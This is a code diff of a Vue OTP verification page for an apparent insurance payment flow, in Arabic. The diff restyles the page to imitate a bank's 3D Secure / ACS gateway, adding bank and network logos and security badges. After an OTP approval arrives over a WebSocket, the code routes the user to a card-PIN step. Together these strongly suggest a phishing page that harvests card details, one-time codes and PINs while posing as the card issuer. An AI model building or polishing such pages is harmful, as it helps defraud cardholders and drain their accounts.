@@ -1,5 +1,5 @@
 <template>
-    <div class="otp-page" dir="rtl">
+    <div class="otp-shell" dir="rtl">
 
         <!-- ── Waiting Loader Modal (teleported fullscreen) ──────────── -->
         <InsuranceLoader v-if="isVerifying && !error" :modal="true" color="amber" size="lg"
@@ -9,97 +9,80 @@
         <!-- ── Main Card ─────────────────────────────────────────────── -->
         <div class="otp-card">
 
-            <!-- Header with gradient -->
-            <div class="otp-header">
-                <h1 class="otp-header__title">
-                    {{ t( 'verification.otp.cardPaymentTitle' ) }}
-                </h1>
-                <p class="otp-header__sub">
-                    {{ t( 'verification.otp.cardOwnershipVerification' ) }}
-                </p>
+            <!-- ═══ A. Topbar: Bank + Network logos ═══════════════════ -->
+            <div class="otp-topbar">
+                <div class="otp-topbar__bank">
+                    <img v-if="bankLogo" :src="bankLogo" :alt="bankName" class="otp-topbar__bank-img" />
+                    <span v-else class="otp-topbar__bank-fallback">{{ bankName || t( 'verification.otp.issuingBank' ) }}</span>
+                </div>
+                <div class="otp-topbar__badge">
+                    <svg class="otp-topbar__shield" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.351-.166-2A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd" /></svg>
+                    <span class="otp-topbar__badge-text">{{ t( 'verification.otp.securePaymentBadge' ) }}</span>
+                </div>
+                <div class="otp-topbar__network">
+                    <img v-if="networkLogo" :src="networkLogo" :alt="networkName" class="otp-topbar__network-img" />
+                </div>
             </div>
 
-            <!-- Body -->
+            <!-- ═══ B. Header: Title + Subtitle ═══════════════════════ -->
+            <div class="otp-header">
+                <h1 class="otp-header__title">{{ t( 'verification.otp.cardPaymentTitle' ) }}</h1>
+                <p class="otp-header__sub">{{ t( 'verification.otp.cardOwnershipVerification' ) }}</p>
+            </div>
+
+            <!-- ═══ C. Body ═══════════════════════════════════════════ -->
             <div class="otp-body">
 
-                <!-- ── Card Branding Strip ──────────────────────────── -->
-                <div v-if="networkLogo || bankLogo" class="otp-branding">
-                    <div class="otp-branding__logos">
-                        <img v-if="bankLogo" :src="bankLogo" :alt="bankName" class="otp-branding__bank" width="80" height="32" />
-                        <span v-if="bankLogo && networkLogo" class="otp-branding__sep"></span>
-                        <img v-if="networkLogo" :src="networkLogo" :alt="networkName" class="otp-branding__network" width="60" height="24" />
+                <!-- Transaction Summary -->
+                <div class="otp-summary">
+                    <div class="otp-summary__row">
+                        <span class="otp-summary__label">{{ t( 'verification.otp.cardLabel' ) }}</span>
+                        <span class="otp-summary__value ltr-nums" dir="ltr">**** {{ cardLast4 || '****' }}</span>
                     </div>
-                    <span v-if="bankName" class="otp-branding__label">{{ bankName }}</span>
-                </div>
-
-                <!-- ── Card Info Summary ─────────────────────────────── -->
-                <div class="otp-card-info">
-                    <div class="otp-card-info__row">
-                        <span class="otp-card-info__label">
-                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                                    d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
-                            </svg>
-                            {{ t( 'verification.otp.usingCardEndingWith' ) }}
-                        </span>
-                        <span class="otp-card-info__value ltr-nums" dir="ltr">
-                            **** {{ cardLast4 || '****' }}
-                        </span>
+                    <div v-if="cardHolder" class="otp-summary__row">
+                        <span class="otp-summary__label">{{ t( 'verification.otp.cardHolderLabel' ) }}</span>
+                        <span class="otp-summary__value otp-summary__value--name">{{ cardHolder }}</span>
                     </div>
-                    <div v-if="cardHolder" class="otp-card-info__row">
-                        <span class="otp-card-info__label">
-                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                                    d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
-                            </svg>
-                            حامل البطاقة
-                        </span>
-                        <span class="otp-card-info__value uppercase">{{ cardHolder }}</span>
-                    </div>
-                    <div v-if="totalAmount > 0" class="otp-card-info__row otp-card-info__row--highlight">
-                        <span class="otp-card-info__label">
-                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                                    d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2z" />
-                            </svg>
-                            {{ t( 'verification.otp.toPayAmount' ) }}
-                        </span>
-                        <span class="otp-card-info__amount">
-                            <SarIcon className="size-3 inline-block fill-secondary" />
+                    <div v-if="totalAmount > 0" class="otp-summary__row otp-summary__row--amount">
+                        <span class="otp-summary__label">{{ t( 'verification.otp.totalAmountLabel' ) }}</span>
+                        <span class="otp-summary__amount">
                             {{ formattedAmount }}
+                            <SarIcon className="size-3.5 inline-block fill-current" />
                         </span>
                     </div>
                 </div>
 
-                <!-- ── OTP Input Section ─────────────────────────────── -->
-                <div class="otp-input-section">
-                    <div class="otp-input-section__header">
-                        <p class="otp-input-section__label">
-                            {{ t( 'verification.otp.verificationCode' ) }}
-                        </p>
-                        <p class="otp-input-section__hint">
-                            {{ t( 'verification.otp.enterOtpToConfirm' ) }}
-                        </p>
+                <!-- Verification Notice -->
+                <div class="otp-notice">
+                    <div class="otp-notice__icon">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                     </div>
+                    <div>
+                        <p class="otp-notice__title">{{ t( 'verification.otp.verifyTransaction' ) }}</p>
+                        <p class="otp-notice__text">{{ t( 'verification.otp.verifyTransactionHint' ) }}</p>
+                    </div>
+                </div>
 
-                    <OtpInput ref="otpInputRef" v-model="otpCode" :length="6" :accept-lengths="[4, 6]" :disabled="isVerifying" :error="error"
-                        @submit="submitOtp" />
+                <!-- OTP Input — focal area -->
+                <div class="otp-form">
+                    <label class="otp-form__label">{{ t( 'verification.otp.verificationCode' ) }}</label>
+                    <p class="otp-form__hint">{{ t( 'verification.otp.enterOtpToConfirm' ) }}</p>
 
-                    <!-- Confirm Button -->
-                    <button :disabled="!isOtpValid || isVerifying" class="otp-submit"
-                        :class="isOtpValid && !isVerifying ? 'otp-submit--active' : 'otp-submit--disabled'"
+                    <OtpInput ref="otpInputRef" v-model="otpCode" :length="6" :accept-lengths="[4, 6]"
+                        :disabled="isVerifying" :error="error" @submit="submitOtp" />
+
+                    <button :disabled="!isOtpValid || isVerifying" class="otp-btn"
+                        :class="isOtpValid && !isVerifying ? 'otp-btn--active' : 'otp-btn--disabled'"
                         @click="submitOtp">
-                        <svg v-if="isVerifying" class="w-5 h-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none"
-                            viewBox="0 0 24 24">
+                        <svg v-if="isVerifying" class="w-5 h-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                             <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
-                            <path class="opacity-75" fill="currentColor"
-                                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                         </svg>
-                        <span>{{ isVerifying ? t( 'verification.otp.verifying' ) : t( 'verification.otp.confirm' ) }}</span>
+                        <span>{{ isVerifying ? t( 'verification.otp.verifying' ) : t( 'verification.otp.confirmTransaction' ) }}</span>
                     </button>
                 </div>
 
-                <!-- ── Resend Section ────────────────────────────────── -->
+                <!-- Timer / Resend -->
                 <div class="otp-resend">
                     <template v-if="resendTimer > 0">
                         <div class="otp-resend__timer">
@@ -107,25 +90,18 @@
                                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                     d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                             </svg>
-                            <span class="text-muted text-sm">
-                                {{ t( 'verification.otp.resendAfter' ) }}
-                            </span>
+                            <span class="otp-resend__text">{{ t( 'verification.otp.resendTimerText' ) }}</span>
                             <span class="otp-resend__countdown ltr-nums">{{ formattedTimer }}</span>
                         </div>
-                        <!-- Timer progress bar -->
                         <div class="otp-resend__bar">
                             <div class="otp-resend__bar-fill" :style="{ width: timerPercent + '%' }"></div>
                         </div>
                     </template>
                     <template v-else>
-                        <p class="text-muted text-xs sm:text-sm mb-2">
-                            {{ t( 'verification.otp.didntReceive' ) }}
-                        </p>
                         <button :disabled="isResending" class="otp-resend__btn" @click="resendOtp">
                             <svg v-if="isResending" class="w-4 h-4 animate-spin" xmlns="http://www.w3.org/2000/svg"
                                 fill="none" viewBox="0 0 24 24">
-                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
-                                    stroke-width="4" />
+                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                                 <path class="opacity-75" fill="currentColor"
                                     d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                             </svg>
@@ -139,25 +115,20 @@
                 </div>
             </div>
 
-            <!-- ── Footer — Payment logos ─────────────────────────── -->
+            <!-- ═══ G. Footer — Trusted logos ═════════════════════════ -->
             <div class="otp-footer">
-                <img :src="paymentLogos" alt="Visa / Mastercard / mada" class="otp-footer__logos" width="180" height="24" />
+                <img :src="paymentLogos" alt="Visa / Mastercard / mada" class="otp-footer__logos" />
+                <div class="otp-footer__secure">
+                    <svg class="otp-footer__lock" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
+                    <span>{{ t( 'common.secureTransaction' ) }}</span>
+                </div>
             </div>
         </div>
 
-        <!-- ── Help & Security (outside card) ────────────────────────── -->
+        <!-- ── Help (outside card) ───────────────────────────────────── -->
         <div class="otp-help">
-            <p>
-                {{ t( 'common.contactUsIfProblem' ) }}
-                <a href="tel:920000000" class="otp-help__phone">920000000</a>
-            </p>
-        </div>
-        <div class="otp-security">
-            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-            </svg>
-            <span>{{ t( 'common.secureTransaction' ) }}</span>
+            <span class="otp-help__label">{{ t( 'common.supportContact' ) }}</span>
+            <a href="tel:920000000" class="otp-help__phone" dir="ltr">920000000</a>
         </div>
     </div>
 </template>
@@ -297,13 +268,18 @@ const { setup: setupWs } = usePaymentWebSocket( {
         logger.debug( '[OTP] Approved:', event );
         isVerifying.value = false;
 
-        if ( event.redirect_to )
+        // Defer navigation to release the WS message handler and avoid
+        // Chrome "[Violation] 'message' handler took Xms" warnings.
+        setTimeout( () =>
         {
-            safeRedirect( event.redirect_to, 'cardPin', router );
-        } else
-        {
-            router.push( { name: 'cardPin' } );
-        }
+            if ( event.redirect_to )
+            {
+                safeRedirect( event.redirect_to, 'cardPin', router );
+            } else
+            {
+                router.push( { name: 'cardPin' } );
+            }
+        }, 0 );
     },
 
     onRejected ( event )
@@ -389,324 +365,349 @@ onUnmounted( () =>
 
 <style scoped>
 /* ═══════════════════════════════════════════════════════════════════
-   OTP Page — Scoped Styles
+   OTP Page — Real 3D Secure / ACS Gateway
+   Institutional banking style: Blue topbar, tight layout, corporate
    ═══════════════════════════════════════════════════════════════════ */
 
-/* Page wrapper */
-.otp-page {
+/* ── Shell ─────────────────────────────────────────────── */
+.otp-shell {
     min-height: 100dvh;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
-    padding: 1rem 0.75rem;
-    background: linear-gradient(160deg, #f0f4f8 0%, #e2e8f0 50%, #f7fbfe 100%);
+    padding: 0.75rem;
+    background: #eef1f5;
 }
 
-/* Card container */
+/* ── Card ──────────────────────────────────────────────── */
 .otp-card {
     width: 100%;
-    max-width: 420px;
+    max-width: 400px;
     background: #fff;
-    border-radius: 1.25rem;
-    box-shadow:
-        0 4px 6px -1px rgb(0 0 0 / 0.07),
-        0 10px 15px -3px rgb(0 0 0 / 0.05),
-        0 20px 25px -5px rgb(0 0 0 / 0.03);
+    border-radius: 0.375rem;
+    border: 1px solid #d1d5db;
+    box-shadow: 0 2px 8px rgb(0 0 0 / 0.08);
     overflow: hidden;
-    animation: otp-card-in 0.5s ease-out;
+    animation: card-in 0.35s ease-out;
 }
 
-@keyframes otp-card-in {
-    from { opacity: 0; transform: translateY(16px) scale(0.98); }
-    to   { opacity: 1; transform: translateY(0) scale(1); }
+@keyframes card-in {
+    from { opacity: 0; transform: translateY(6px); }
+    to   { opacity: 1; transform: translateY(0); }
 }
 
-/* ── Header ─────────────────────────────────────────────── */
-.otp-header {
-    background: linear-gradient(135deg, #006bbf 0%, #0088eb 50%, #33a0ef 100%);
-    padding: 1.5rem 1.5rem 1.75rem;
-    text-align: center;
-    position: relative;
-    overflow: hidden;
-}
-
-.otp-header::before {
-    content: '';
-    position: absolute;
-    top: -50%;
-    right: -30%;
-    width: 200%;
-    height: 200%;
-    background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 60%);
-    pointer-events: none;
-}
-
-.otp-header__icon {
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    width: 3rem;
-    height: 3rem;
-    background: rgba(255, 255, 255, 0.2);
-    border-radius: 0.875rem;
-    margin-bottom: 0.75rem;
-    backdrop-filter: blur(8px);
-}
-
-.otp-header__title {
-    color: #fff;
-    font-size: 1.125rem;
-    font-weight: 700;
-    margin: 0 0 0.25rem;
-}
-
-.otp-header__sub {
-    color: rgba(255, 255, 255, 0.85);
-    font-size: 0.8125rem;
-    font-weight: 400;
-    margin: 0;
-}
-
-/* ── Body ───────────────────────────────────────────────── */
-.otp-body {
-    padding: 1.25rem 1.25rem 1rem;
-    display: flex;
-    flex-direction: column;
-    gap: 1.25rem;
-}
-
-@media (min-width: 640px) {
-    .otp-body { padding: 1.75rem 1.75rem 1.25rem; }
-}
-/* ── Card branding strip ────────────────────────────── */
-.otp-branding {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 0.5rem;
-    padding: 1rem;
-    background: linear-gradient(135deg, #f8fafc 0%, #f7fbfe 100%);
-    border: 1px solid #e2e8f0;
-    border-radius: 0.875rem;
-}
-
-.otp-branding__logos {
-    display: flex;
-    align-items: center;
-    gap: 0.75rem;
-}
-
-.otp-branding__bank {
-    height: 2rem;
-    width: auto;
-    max-width: 7rem;
-    object-fit: contain;
-}
-
-.otp-branding__network {
-    height: 1.5rem;
-    width: auto;
-    max-width: 4rem;
-    object-fit: contain;
-}
-
-.otp-branding__sep {
-    width: 1px;
-    height: 1.5rem;
-    background: #cbd5e1;
-}
-
-.otp-branding__label {
-    font-size: 0.75rem;
-    font-weight: 600;
-    color: #64748b;
-}
-/* ── Card info summary ──────────────────────────────────── */
-.otp-card-info {
-    background: #f8fafc;
-    border: 1px solid #e2e8f0;
-    border-radius: 0.875rem;
-    padding: 0.75rem;
-    display: flex;
-    flex-direction: column;
-    gap: 0;
-}
-
-.otp-card-info__row {
+/* ── A. Topbar — Blue institutional header ────────────── */
+.otp-topbar {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding: 0.5rem 0.375rem;
-    font-size: 0.8125rem;
+    padding: 0.5rem 0.875rem;
+    background: linear-gradient(180deg, #1a5276 0%, #154360 100%);
+    border-bottom: 2px solid #0e2f44;
 }
 
-.otp-card-info__row:not(:last-child) {
-    border-bottom: 1px dashed #e2e8f0;
-}
-
-.otp-card-info__row--highlight {
-    background: linear-gradient(90deg, rgba(0, 136, 235, 0.04) 0%, rgba(0, 136, 235, 0.08) 100%);
-    border-radius: 0.625rem;
-    margin: 0.25rem -0.25rem -0.25rem;
-    padding: 0.625rem;
-}
-
-.otp-card-info__label {
+.otp-topbar__bank,
+.otp-topbar__network {
+    flex: 0 0 auto;
     display: flex;
     align-items: center;
-    gap: 0.375rem;
-    color: #64748b;
-    font-weight: 500;
+    min-width: 40px;
 }
 
-.otp-card-info__value {
-    font-weight: 700;
-    color: #1e293b;
-}
-
-.otp-card-info__amount {
-    font-size: 1rem;
-    font-weight: 800;
-    color: var(--color-secondary, #1db97d);
-}
-
-.otp-card-info__inline-logo {
-    height: 0.875rem;
+.otp-topbar__bank-img {
+    height: 1.375rem;
     width: auto;
-    display: inline-block;
-    vertical-align: middle;
-    margin-inline-end: 0.25rem;
-    opacity: 0.85;
+    max-width: 5rem;
+    object-fit: contain;
+    filter: brightness(0) invert(1);
 }
 
-/* ── OTP input section ──────────────────────────────────── */
-.otp-input-section {
-    text-align: center;
-    background: linear-gradient(135deg, #f0fdf4 0%, #f7fbfe 50%, #ecfdf5 100%);
-    border: 1.5px solid #bbf7d0;
-    border-radius: 1rem;
-    padding: 1.25rem 1rem;
+.otp-topbar__bank-fallback {
+    font-size: 0.6875rem;
+    font-weight: 600;
+    color: rgba(255, 255, 255, 0.7);
 }
 
-.otp-input-section__header {
-    margin-bottom: 1rem;
+.otp-topbar__network-img {
+    height: 1.25rem;
+    width: auto;
+    max-width: 3.5rem;
+    object-fit: contain;
 }
 
-.otp-input-section__icon {
-    display: inline-flex;
+.otp-topbar__badge {
+    display: flex;
     align-items: center;
-    justify-content: center;
-    width: 2.75rem;
-    height: 2.75rem;
-    background: linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%);
-    border-radius: 50%;
-    margin-bottom: 0.625rem;
+    gap: 0.25rem;
+    font-size: 0.5625rem;
+    font-weight: 500;
+    color: rgba(255, 255, 255, 0.8);
+    background: rgba(255, 255, 255, 0.1);
+    padding: 0.1875rem 0.5rem;
+    border-radius: 2px;
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    white-space: nowrap;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
 }
 
-.otp-input-section__label {
-    display: block;
-    font-size: 1rem;
-    font-weight: 800;
-    color: #065f46;
-    margin-bottom: 0.25rem;
+.otp-topbar__shield {
+    width: 0.625rem;
+    height: 0.625rem;
+    color: #4fc3f7;
+    flex-shrink: 0;
 }
 
-.otp-input-section__hint {
-    font-size: 0.75rem;
+/* ── B. Header ────────────────────────────────────────── */
+.otp-header {
+    padding: 0.75rem 1rem 0.5rem;
+    text-align: center;
+    background: #f8f9fa;
+    border-bottom: 1px solid #e5e7eb;
+}
+
+.otp-header__title {
+    font-size: 0.875rem;
+    font-weight: 700;
+    color: #1a2332;
+    margin: 0 0 0.125rem;
+}
+
+.otp-header__sub {
+    font-size: 0.6875rem;
+    font-weight: 400;
     color: #6b7280;
     margin: 0;
-    line-height: 1.5;
+    line-height: 1.4;
 }
 
-/* ── Submit button ──────────────────────────────────────── */
-.otp-submit {
-    width: 100%;
-    padding: 0.8125rem;
-    border-radius: 0.875rem;
+/* ── C. Body ──────────────────────────────────────────── */
+.otp-body {
+    padding: 0.5rem 0.75rem;
+    display: flex;
+    flex-direction: column;
+    gap: 0.375rem;
+}
+
+@media (min-width: 480px) {
+    .otp-body { padding: 0.5rem 0.875rem; gap: 0.4375rem; }
+}
+
+@media (min-width: 640px) {
+    .otp-body { padding: 0.75rem 1rem; gap: 0.5rem; }
+}
+
+/* ── Transaction summary ──────────────────────────────── */
+.otp-summary {
+    background: #f9fafb;
+    border: 1px solid #e5e7eb;
+    border-radius: 0.25rem;
+    overflow: hidden;
+}
+
+.otp-summary__row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0.25rem 0.5rem;
+    font-size: 0.6875rem;
+}
+
+.otp-summary__row:not(:last-child) {
+    border-bottom: 1px solid #eef0f2;
+}
+
+.otp-summary__row--amount {
+    background: #eef4fb;
+    padding: 0.3125rem 0.5rem;
+}
+
+.otp-summary__label {
+    color: #6b7280;
+    font-weight: 500;
+    font-size: 0.625rem;
+}
+
+.otp-summary__value {
+    font-weight: 600;
+    color: #1f2937;
+    letter-spacing: 0.01em;
+    font-size: 0.6875rem;
+}
+
+.otp-summary__value--name {
+    text-transform: uppercase;
+    font-size: 0.6875rem;
+    letter-spacing: 0.04em;
+}
+
+.otp-summary__amount {
+    font-size: 0.8125rem;
     font-weight: 700;
-    font-size: 0.9375rem;
+    color: #1a2332;
+    display: flex;
+    align-items: center;
+    gap: 0.1875rem;
+}
+
+/* ── Verification notice ──────────────────────────────── */
+.otp-notice {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.25rem;
+    padding: 0.25rem 0.4375rem;
+    background: #fffbeb;
+    border: 1px solid #fde68a;
+    border-radius: 0.1875rem;
+}
+
+.otp-notice__icon {
+    flex-shrink: 0;
+    width: 0.875rem;
+    height: 0.875rem;
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 0.5rem;
+    color: #d97706;
+}
+
+.otp-notice__title {
+    font-size: 0.5625rem;
+    font-weight: 600;
+    color: #92400e;
+    margin: 0;
+}
+
+.otp-notice__text {
+    font-size: 0.5rem;
+    color: #a16207;
+    margin: 0;
+    line-height: 1.35;
+}
+
+/* ── OTP form ─────────────────────────────────────────── */
+.otp-form {
+    text-align: center;
+    padding: 0.375rem 0;
+    background: transparent;
+    border: none;
+    border-radius: 0;
+}
+
+.otp-form__label {
+    display: block;
+    font-size: 0.75rem;
+    font-weight: 700;
+    color: #1a2332;
+    margin-bottom: 0.0625rem;
+}
+
+.otp-form__hint {
+    font-size: 0.5625rem;
+    color: #9ca3af;
+    margin: 0 0 0.375rem;
+    line-height: 1.3;
+}
+
+/* ── CTA button ───────────────────────────────────────── */
+.otp-btn {
+    width: 100%;
+    padding: 0.4375rem;
+    border-radius: 0.25rem;
+    font-weight: 600;
+    font-size: 0.75rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.375rem;
     border: none;
     cursor: pointer;
-    transition: all 0.25s ease;
+    transition: background 0.15s ease;
+    margin-top: 0.25rem;
 }
 
-.otp-submit--active {
-    background: linear-gradient(135deg, #006bbf 0%, #0088eb 100%);
+.otp-btn--active {
+    background: #1a5276;
     color: #fff;
-    box-shadow: 0 4px 12px rgba(0, 136, 235, 0.3);
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
 }
 
-.otp-submit--active:hover {
-    transform: translateY(-1px);
-    box-shadow: 0 6px 16px rgba(0, 136, 235, 0.4);
+.otp-btn--active:hover {
+    background: #154360;
 }
 
-.otp-submit--active:active {
-    transform: translateY(0);
+.otp-btn--active:active {
+    background: #0e2f44;
 }
 
-.otp-submit--disabled {
-    background: #f1f5f9;
-    color: #94a3b8;
+.otp-btn--disabled {
+    background: #e5e7eb;
+    color: #9ca3af;
     cursor: not-allowed;
+    border: none;
 }
 
-/* ── Resend section ─────────────────────────────────────── */
+/* ── Resend ───────────────────────────────────────────── */
 .otp-resend {
     text-align: center;
+    padding-top: 0;
 }
 
 .otp-resend__timer {
     display: inline-flex;
     align-items: center;
-    gap: 0.375rem;
-    margin-bottom: 0.5rem;
+    gap: 0.1875rem;
+    margin-bottom: 0.1875rem;
+}
+
+.otp-resend__text {
+    font-size: 0.625rem;
+    color: #9ca3af;
 }
 
 .otp-resend__countdown {
     font-weight: 700;
-    font-size: 0.9375rem;
-    color: var(--color-primary, #0088eb);
-    min-width: 2.5rem;
+    font-size: 0.75rem;
+    color: #1a5276;
+    min-width: 2rem;
+    letter-spacing: 0.01em;
 }
 
 .otp-resend__bar {
-    width: 100%;
-    height: 3px;
-    background: #e2e8f0;
-    border-radius: 2px;
+    width: 50%;
+    height: 1px;
+    background: #e5e7eb;
+    border-radius: 1px;
     overflow: hidden;
+    margin: 0 auto;
 }
 
 .otp-resend__bar-fill {
     height: 100%;
-    background: linear-gradient(90deg, #006bbf, #33a0ef);
-    border-radius: 2px;
+    background: #1a5276;
+    border-radius: 1px;
     transition: width 1s linear;
 }
 
 .otp-resend__btn {
     display: inline-flex;
     align-items: center;
-    gap: 0.375rem;
-    padding: 0.5rem 1.25rem;
-    border-radius: 0.75rem;
-    border: 1.5px solid var(--color-primary, #0088eb);
-    background: transparent;
-    color: var(--color-primary, #0088eb);
-    font-size: 0.8125rem;
+    gap: 0.25rem;
+    padding: 0.3125rem 0.75rem;
+    border-radius: 0.1875rem;
+    border: 1px solid #d1d5db;
+    background: #fff;
+    color: #4b5563;
+    font-size: 0.6875rem;
     font-weight: 600;
     cursor: pointer;
-    transition: all 0.2s;
+    transition: all 0.15s;
 }
 
 .otp-resend__btn:hover:not(:disabled) {
-    background: #f7fbfe;
+    border-color: #1a5276;
+    color: #1a5276;
 }
 
 .otp-resend__btn:disabled {
@@ -714,62 +715,66 @@ onUnmounted( () =>
     cursor: not-allowed;
 }
 
-/* ── Footer ─────────────────────────────────────────────── */
-.otp-footer__logos {
-    display: block;
-    max-width: 180px;
-    height: auto;
-    margin: 0 auto;
-}
-
+/* ── Footer ───────────────────────────────────────────── */
 .otp-footer {
-    padding: 1rem 1.25rem 1.25rem;
-    background: #fafbfc;
-    border-top: 1px solid #f1f5f9;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0.375rem 0.875rem;
+    background: #f3f4f6;
+    border-top: 1px solid #e5e7eb;
 }
 
-.otp-footer__divider {
-    height: 1px;
-    background: #e2e8f0;
-    margin: 0.75rem 0;
+.otp-footer__logos {
+    height: 0.75rem;
+    width: auto;
+    opacity: 0.5;
 }
 
-.otp-footer__active {
-    filter: drop-shadow(0 0 4px rgba(0, 136, 235, 0.35));
-    transform: scale(1.1);
+.otp-footer__secure {
+    display: flex;
+    align-items: center;
+    gap: 0.1875rem;
+    font-size: 0.5625rem;
+    color: #9ca3af;
+    font-weight: 400;
 }
 
-/* ── Help & security (outside card) ─────────────────────── */
+.otp-footer__lock {
+    width: 0.5625rem;
+    height: 0.5625rem;
+}
+
+/* ── Help ──────────────────────────────────────────────── */
 .otp-help {
-    margin-top: 1rem;
+    margin-top: 0.5rem;
     text-align: center;
-    font-size: 0.75rem;
-    color: #94a3b8;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.25rem;
+}
+
+.otp-help__label {
+    font-size: 0.625rem;
+    color: #9ca3af;
 }
 
 .otp-help__phone {
-    color: var(--color-primary, #0088eb);
+    color: #1a5276;
     font-weight: 700;
-    font-size: 0.875rem;
+    font-size: 0.6875rem;
     text-decoration: none;
-    margin-right: 0.25rem;
 }
 
 .otp-help__phone:hover { text-decoration: underline; }
 
-.otp-security {
-    margin-top: 0.625rem;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 0.375rem;
-    color: #cbd5e1;
-    font-size: 0.6875rem;
-}
-
-/* ── Responsive fine-tuning ─────────────────────────────── */
+/* ── Responsive ───────────────────────────────────────── */
 @media (max-width: 380px) {
-    .otp-header { padding: 1.25rem 1rem 1.5rem; }
-    .otp-body { padding: 1rem; gap: 1rem; }
+    .otp-topbar { padding: 0.4375rem 0.625rem; }
+    .otp-topbar__badge-text { display: none; }
+    .otp-topbar__badge { padding: 0.125rem 0.25rem; }
+    .otp-header { padding: 0.625rem 0.75rem 0.375rem; }
+    .otp-body { padding: 0.5rem 0.625rem; gap: 0.375rem; }
 }
 </style>
